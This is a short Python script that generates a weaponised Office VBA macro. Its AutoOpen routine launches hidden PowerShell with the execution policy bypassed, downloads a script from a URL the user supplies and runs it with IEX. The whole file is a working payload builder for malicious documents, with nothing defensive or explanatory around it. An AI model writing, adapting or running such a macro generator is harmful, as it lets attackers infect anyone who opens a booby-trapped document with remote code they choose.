import argparse

def generate_macro(ps_url):
    return f"""
Sub AutoOpen()
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('{ps_url}')"
End Sub
"""

def main():
    parser = argparse.ArgumentParser(description="Generate Office Macro with PowerShell URL payload")
    parser.add_argument("url", help="URL of the PowerShell script to download and execute")
    parser.add_argument("-o", "--output", default="macro.vba", help="Output macro filename (default: macro.vba)")
    args = parser.parse_args()

    macro_code = generate_macro(args.url)
    with open(args.output, "w") as f:
        f.write(macro_code)
    print(f"[+] Macro payload generated and saved to {args.output}")

if __name__ == "__main__":
    main()

